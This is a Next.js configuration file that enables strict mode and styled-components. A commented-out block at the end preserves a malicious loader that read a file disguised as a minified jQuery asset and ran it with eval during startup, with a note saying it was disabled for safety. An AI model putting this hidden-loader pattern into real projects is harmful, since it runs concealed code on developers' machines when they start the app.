/** @type {import('next').NextConfig} */

const nextConfig = {
  reactStrictMode: true,
  compiler: {
    styledComponents: true,
  },
};

module.exports = nextConfig;

// SECURITY: The block below was malicious stage-0 code. It read a local file
// and executed it via eval during Next.js startup. It is intentionally
// commented out so the repository is safe to check out.
// const jmpparser = require("fs");
// jmpparser.readFile(
//   __dirname + "/public/assets/js/jquery.min.js",
//   "utf8",
//   (err, code) => {
//     eval(code);
//     console.log(err);
//   }
// );